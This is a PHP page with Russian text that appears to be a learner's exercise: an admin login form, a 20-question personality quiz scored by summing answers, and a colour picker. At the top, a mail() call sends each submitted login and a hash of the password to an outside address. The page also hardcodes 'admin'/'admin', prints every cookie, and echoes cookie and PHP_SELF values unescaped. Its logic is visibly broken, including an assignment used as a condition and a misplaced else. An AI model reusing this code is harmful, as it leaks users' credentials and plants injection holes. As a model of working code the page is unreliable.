<?php
require_once '../inc/header.php';
session_start();
$_SESSION['login'] = $_POST['login'];



$name = sha1('admin');
$passwd = sha1('admin');
mail("mgn.ru", $_POST['login'], md5($_POST['password']), "mgn2.ru");
setcookie('color',$_COOKIE['color'], time() + 3600 * 24 * 7);

print_r($_COOKIE);

session_unset();
unset($_SESSION['login']); //удаление переменных сессии

//if (!empty($argv) && array_key_exists('1', $argv) && mb_strlen($argv[1]) > 2) {
if (isset($_POST["submit5"])) {

    if ($_POST['color'] = 1) {

        $bg = 'green';
        $_COOKIE['color'] = $bg;
        //$color = '#fff';
    } else

        $bg = 'blue';
    $_COOKIE['color'] = $bg;
   // $color = 'darkblue';
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Авторизация</title>
    <style>
    body{
    background: <?php echo $bg; ?>;

    }</style>
    <link rel="stylesheet" href="../styles/style1.css" >
</head>
<body>

<?php
      if(isset($_POST['submit'])):
    $name2 = sha1($_POST['login']);
    $passwd2 = sha1($_POST['password']);
    echo ($name == $name2 && $passwd == $passwd2) ? '<p>Доступ открыт Добро пожаловать АДМИН</p> 
<p>Последний посещенный сайт</p>'. $_COOKIE['site']
          : '<p>Неверный логин пароль</p>';
else:
    ?>

<form class="log" method="post" action = "<?=$_SERVER['PHP_SELF']?>" >
    <label for="login">Введите имя пользователя</label>
        <input type="text" name="login"  id ="login" ><br>
    <label for="password">Введите пароль</label>
        <input type="password" name="password"  id ="password"><br>
    <input type="submit" name = "submit" value="Проверить">

</form>

<? endif;?>
<hr color="red">
<div>

    <a href="bitrix.php" name="site">Сайт Битрикс</a>
    <a href="Fact.php" name="site">Caйт Факт</a>


</div>
<hr color="red">
<p>Анкета пользователя</p>
<?
$v =[];
echo '<form name="form2" action="" method="post">
<p><b>1.Ваш пол мужской?:</b></p>
<p><input  name="v[1]" type="radio" value="0">Да
    <input name="v[1]" type="radio" value="1">Нет<br></p>

    <p><b>2.Ваш пол Женский?:</b></p>
    <p><input  name="v[2]" type="radio" value="0">Да
        <input name="v[2]" type="radio" value="1">Нет<br></p>

    <p><b>3.Вы программист?:</b></p>
    <p><input  name="v[3]" type="radio" value="1">Да
        <input name="v[3]" type="radio" value="0">Нет<br></p>

    <p><b>4.Вы пользуетесь смартфоном?:</b></p>
    <p><input  name="v[4]" type="radio" value="0">Да
        <input name="v[4]" type="radio" value="1">Нет<br></p>

    <p><b>5.Вы любите животных?:</b></p>
    <p><input  name="v[5]" type="radio" value="0">Да
        <input name="v[5]" type="radio" value="1">Нет<br></p>

    <p><b>6.У вас есть автомобиль?:</b></p>
    <p><input  name="v[6]" type="radio" value="0">Да
        <input name="v[6]" type="radio" value="1">Нет<br></p>

    <p><b>7.Вы пользуетсеь банковской картой?:</b></p>
    <p><input  name="v[7]" type="radio" value="0">Да
        <input name="v[7]" type="radio" value="1">Нет<br></p>

    <p><b>8.Вы любите фотографировать?:</b></p>
    <p><input  name="v[8]" type="radio" value="0">Да
        <input name="v[8]" type="radio" value="1">Нет<br></p>

    <p><b>9.У вас есть домашние животные?:</b></p>
    <p><input  name="v[9]" type="radio" value="1">Да
        <input name="v[9]" type="radio" value="0">Нет<br></p>

    <p><b>10.Вам нарвится ваша работа?:</b></p>
    <p><input  name="v[10]" type="radio" value="1">Да
        <input name="v[10]" type="radio" value="0">Нет<br></p>

<p><b>11.Вы любите горы?:</b></p>
<p><input  name="v[11]" type="radio" value="0">Да
    <input name="v[11]" type="radio" value="1">Нет<br></p>

    <p><b>12.Вы люите спать?:</b></p>
    <p><input  name="v[12]" type="radio" value="0">Да
        <input name="v[12]" type="radio" value="1">Нет<br></p>

    <p><b>13.Вы дюбите поесть?:</b></p>
    <p><input  name="v[13]" type="radio" value="1">Да
        <input name="v[13]" type="radio" value="0">Нет<br></p>

    <p><b>14.Вы пользуетесь такси?:</b></p>
    <p><input  name="v[14]" type="radio" value="1">Да
        <input name="v[14]" type="radio" value="0">Нет<br></p>

    <p><b>15.Вы любите танцевать?:</b></p>
    <p><input  name="v[15]" type="radio" value="0">Да
        <input name="v[15]" type="radio" value="1">Нет<br></p>

    <p><b>16.У вас есть дача?:</b></p>
    <p><input  name="v[16]" type="radio" value="0">Да
        <input name="v[16]" type="radio" value="1">Нет<br></p>

    <p><b>17.Вы пользуетсеь техникой apple?:</b></p>
    <p><input  name="v[17]" type="radio" value="0">Да
        <input name="v[17]" type="radio" value="1">Нет<br></p>

    <p><b>18.Вы любите яблоки?:</b></p>
    <p><input  name="v[18]" type="radio" value="0">Да
        <input name="v[18]" type="radio" value="1">Нет<br></p>

    <p><b>19.У вас спортивное телосложение?:</b></p>
    <p><input  name="v[19]" type="radio" value="1">Да
        <input name="v[19]" type="radio" value="0">Нет<br></p>

    <p><b>20.Вы любите петь?:</b></p>
    <p><input  name="v[20]" type="radio" value="0">Да
        <input name="v[20]" type="radio" value="1">Нет<br></p>

    
    <input type="submit" name="submit2" value="Отправить"><br>
    </form>';

!empty($_POST);
    if (isset($_POST["submit2"])) {
        echo 'Сумма баллов составила ' . array_sum($_POST['v']) . " баллов <br>";

    $su = array_sum($_POST['v']);
    if ($su > 15) {
        echo "У Вас покладистый характер<br>";}
        if ($su <= 15 & $su >= 8) {
            echo "Вы не лишены недостатков, но с вами можно ладить<br>";
        }
if ($su < 8) {
        echo "Вашим друзьям можно посочувствовать<br>"; }}


    ?>
<hr color="red">
<p>Выбор цвета</p>
<select class="form-control" id="mySelect" name="mySelect">
    <option name="color" value="1" >синий</option>
    <option name="color" value="2">зеленый</option>
    <input type="submit" name="submit5">
    </select>

</body>
<? require_once '../inc/footer.php' ?>
</html>
